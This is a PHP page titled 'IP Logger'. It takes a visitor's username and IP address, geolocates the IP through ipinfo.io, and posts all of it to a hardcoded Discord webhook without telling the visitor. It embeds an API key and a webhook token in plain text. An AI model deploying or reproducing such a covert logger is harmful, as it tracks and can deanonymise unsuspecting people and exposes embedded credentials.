<?php
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Initialize variables
$username = '';
$visitorIP = '';
$location = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture the username from the POST request
    $username = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : 'Guest';
    
    // Get the visitor's IP address
    $visitorIP = getClientIP();
    
    // Get the current date and time
    $date = date('Y-m-d H:i:s');
    
    // Fetch geolocation data using ipinfo.io API
    $apiKey = '70e3238d27acd2';
    $geoURL = "https://ipinfo.io/{$visitorIP}?token={$apiKey}";
    
    $ch = curl_init($geoURL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $geoResponse = curl_exec($ch);
    curl_close($ch);
    
    $geoData = json_decode($geoResponse, true);
    
    if ($geoData && isset($geoData['bogon']) && $geoData['bogon'] == true) {
        $location = "This is a bogon IP address. <br> Which means that this is a reserved IP address and not a real public IP.";
    } elseif ($geoData && isset($geoData['city'])) {
        $location = "{$geoData['city']}, {$geoData['region']}, {$geoData['country']}";
    } else {
        $location = "Location data not available. Response: " . print_r($geoData, true);
    }
    
    // Send the log entry and geolocation data to the Discord webhook
    $webhookURL = "https://discord.com/api/webhooks/1256215747395452929/ijEHp4zN2B-GgjM6bpILaqwdYyQBtCRyR--pPIcGF7w8XZt4_Pl6y5TpeXPp5TQo-Dc4";
    $payload = json_encode([
        "content" => "Username: $username - IP: $visitorIP - Date: $date\nLocation: $location"
    ]);
    
    $ch = curl_init($webhookURL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    $response = curl_exec($ch);
    curl_close($ch);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <h1>Welcome, <?php echo $username; ?>!</h1>
            <p>Is this your IP address?</p>
            <p><strong><?php echo $visitorIP; ?></strong></p>
            <p>Your approximate location is: <strong><?php echo $location; ?></strong></p>
        <?php else: ?>
            <h1>Welcome to the IP Logger</h1>
            <p>Please enter your username to continue:</p>
            <form action="" method="post">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
                <button type="submit">Submit</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>
